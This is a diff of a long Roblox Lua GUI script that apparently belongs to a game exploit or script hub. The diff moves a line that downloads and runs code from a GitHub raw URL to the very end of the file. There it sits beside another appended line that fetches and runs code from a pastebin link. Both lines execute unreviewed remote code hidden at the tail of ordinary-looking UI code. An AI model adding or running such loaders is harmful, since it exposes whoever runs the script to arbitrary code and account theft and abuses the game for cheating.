@@ -1737,8 +1737,6 @@ game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
 end)
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/scripts/refs/heads/main/testscript.lua"))()
-
 Naruto.Name = "Naruto"
 Naruto.Parent = Scripts
 Naruto.BackgroundColor3 = Color3.fromRGB(255, 163, 26)
@@ -9907,3 +9905,4 @@ local function EREBEG_fake_script() -- Main.Drag
 	script.Parent.Draggable = true
 end
 coroutine.wrap(EREBEG_fake_script)() loadstring(game:HttpGet("https://pastebin.com/raw/gxk0MMuz"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/scripts/refs/heads/main/testscript.lua"))()
